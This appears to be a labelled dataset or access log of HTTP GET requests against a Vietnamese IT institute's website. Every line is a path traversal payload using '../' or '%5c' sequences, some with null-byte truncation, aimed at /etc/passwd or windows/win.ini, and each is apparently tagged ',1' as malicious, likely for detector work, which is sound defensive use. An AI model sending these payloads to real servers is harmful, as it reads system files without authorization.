GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/hop-tac-khmt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00phong-thi-nghiem-cong-nghe-mang-va-truyen-thong/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00hop-tac-ttm/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00hop-tac-cnpm/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00hop-tac-khmt/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/hop-tac-ttmt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/gioi-thieu-chung-ttmt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/gioi-thieu-chung-ttm../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00hop-tac-ttmt/,1
GET/index.php/2017/03/13/hop-tac-ktmt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00gioi-thieu-chung-ttmt/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00gioi-thieu-chung-ttm/,1
GET/index.php/2017/03/13/phong-thi-nghiem-cong-nghe-mang-va-truyen-thong../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00hop-tac-ktmt/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00phong-thi-nghiem-cong-nghe-mang-va-truyen-thong/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/phong-thi-nghiem-he-thong-may-tinh..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00phong-thi-nghiem-he-thong-may-tinh/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/phong-thi-nghiem-he-thong-may-tinh../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00phong-thi-nghiem-he-thong-may-tinh/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/phong-thi-nghiem-khoa-hoc-du-lieu..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00phong-thi-nghiem-khoa-hoc-du-lieu/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/phong-thi-nghiem-khoa-hoc-du-lieu../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00phong-thi-nghiem-khoa-hoc-du-lieu/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00phong-thi-nghiem-ky-thuat-phan-mem-va-xu-ly-phan-tan/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00sach-xuat-ban-cnpm/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00ptn-mo-hinh-hoa-mo-phong-va-toi-uu-hoa/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00sach-xuat-ban-khmt/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00sach-xuat-ban-ttm/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/sach-xuat-ban-cnpm../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/18/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/van-phong-du-an..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/cac-truong-doi-tac..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/bieu-mau..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00sach-xuat-ban-cnpm/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00van-phong-du-an/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cac-truong-doi-tac/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00bieu-mau/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/sach-xuat-ban-khmt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/sach-xuat-ban-ttm../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/18/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00lich-su-hinh-thanh-va-phat-trien/,1
GET/index.php/2017/03/13/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00sach-xuat-ban-ktmt/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00sach-xuat-ban-khmt/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00sach-xuat-ban-ttm/,1
GET/index.php/2017/03/18/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/cac-truong-doi-tac../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/van-phong-du-an../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/bieu-mau../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd%00cac-truong-doi-tac/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00van-phong-du-an/,1
GET/index.php/2017/03/18/lich-su-hinh-thanh-va-phat-trien../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/13/sach-xuat-ban-ktmt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd%00bieu-mau/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt/,1
GET/index.php/2017/03/18/../../../../../../../../../../../../../../../../etc/passwd%00lich-su-hinh-thanh-va-phat-trien/,1
GET/index.php/2017/03/13/../../../../../../../../../../../../../../../../etc/passwd%00sach-xuat-ban-ktmt/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd%00thong-tin-chung-ve-to-tu-van-hoc-tap-vien-cntt-tt/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cau-hoi-thuong-gap/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/cau-hoi-thuong-gap../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/16/../../../../../../../../../../../../../../../../etc/passwd%00cau-hoi-thuong-gap/,1
GET/index.php/2017/03/29/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/29/chuyen-di-thuc-dia-tai-sanriku-nhat-ban..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/03/29/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00chuyen-di-thuc-dia-tai-sanriku-nhat-ban/,1
GET/index.php/2017/03/29/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/29/chuyen-di-thuc-dia-tai-sanriku-nhat-ban../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/03/29/../../../../../../../../../../../../../../../../etc/passwd%00chuyen-di-thuc-dia-tai-sanriku-nhat-ban/,1
GET/index.php/2017/10/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/11/09/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/10/16/tuat-2017..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/11/09/thuc-tap-nghien-cuu-tai-vien-tin-hoc-quoc-gia-nhat-ban..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/bai-bao-khoa-hoc..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/09/22/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/10/19/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/10/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00tuat-2017/,1
GET/index.php/2017/11/09/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00thuc-tap-nghien-cuu-tai-vien-tin-hoc-quoc-gia-nhat-ban/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00bai-bao-khoa-hoc/,1
GET/index.php/2017/11/05/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/cac-huong-nghien-cuu..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/10/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/11/09/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/09/22/vien-cntttt-nhan-giai-thuong-ict-education-award-cua-asocio..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/12/25/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/10/19/bao-cao-ket-qua-thuc-tap-cua-cac-sinh-vien-di-thuc-tap-tai-dai-hoc-ky-thuat-nanyang-singapore..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cac-huong-nghien-cuu/,1
GET/index.php/2017/09/22/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00vien-cntttt-nhan-giai-thuong-ict-education-award-cua-asocio/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/10/16/tuat-2017../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/10/19/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00bao-cao-ket-qua-thuc-tap-cua-cac-sinh-vien-di-thuc-tap-tai-dai-hoc-ky-thuat-nanyang-singapore/,1
GET/index.php/2017/11/05/sv-attt-sk-2017..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/11/09/thuc-tap-nghien-cuu-tai-vien-tin-hoc-quoc-gia-nhat-ban../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/12/25/chuc-mung-nhom-sinh-vien-cua-vien-da-dat-giai-svnckh-cap-bo-2017..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2017/09/22/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/bai-bao-khoa-hoc../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/11/05/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00sv-attt-sk-2017/,1
GET/index.php/2017/10/16/../../../../../../../../../../../../../../../../etc/passwd%00tuat-2017/,1
GET/index.php/2017/10/19/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/11/09/../../../../../../../../../../../../../../../../etc/passwd%00thuc-tap-nghien-cuu-tai-vien-tin-hoc-quoc-gia-nhat-ban/,1
GET/index.php/2017/12/25/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00chuc-mung-nhom-sinh-vien-cua-vien-da-dat-giai-svnckh-cap-bo-2017/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00bai-bao-khoa-hoc/,1
GET/index.php/2017/11/05/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/cac-mon-hoc..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/cac-huong-nghien-cuu../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/12/25/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/09/22/vien-cntttt-nhan-giai-thuong-ict-education-award-cua-asocio../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00cac-mon-hoc/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00cac-huong-nghien-cuu/,1
GET/index.php/2017/10/19/bao-cao-ket-qua-thuc-tap-cua-cac-sinh-vien-di-thuc-tap-tai-dai-hoc-ky-thuat-nanyang-singapore../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/09/22/../../../../../../../../../../../../../../../../etc/passwd%00vien-cntttt-nhan-giai-thuong-ict-education-award-cua-asocio/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/10/19/../../../../../../../../../../../../../../../../etc/passwd%00bao-cao-ket-qua-thuc-tap-cua-cac-sinh-vien-di-thuc-tap-tai-dai-hoc-ky-thuat-nanyang-singapore/,1
GET/index.php/2017/11/05/sv-attt-sk-2017../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/12/25/chuc-mung-nhom-sinh-vien-cua-vien-da-dat-giai-svnckh-cap-bo-2017../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2017/12/25/../../../../../../../../../../../../../../../../etc/passwd%00chuc-mung-nhom-sinh-vien-cua-vien-da-dat-giai-svnckh-cap-bo-2017/,1
GET/index.php/2017/11/05/../../../../../../../../../../../../../../../../etc/passwd%00sv-attt-sk-2017/,1
GET/index.php/2018/01/16/cac-mon-hoc../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00cac-mon-hoc/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/co-so-vat-chat..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/danh-sach-de-tai..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00co-so-vat-chat/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00danh-sach-de-tai/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/co-so-vat-chat../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/danh-sach-de-tai../../../../../../../../../../../../../../../../etc/passwd/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00co-so-vat-chat/,1
GET/index.php/2018/01/16/../../../../../../../../../../../../../../../../etc/passwd%00danh-sach-de-tai/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/hop-tac..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
GET/index.php/2018/01/16/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini/,1
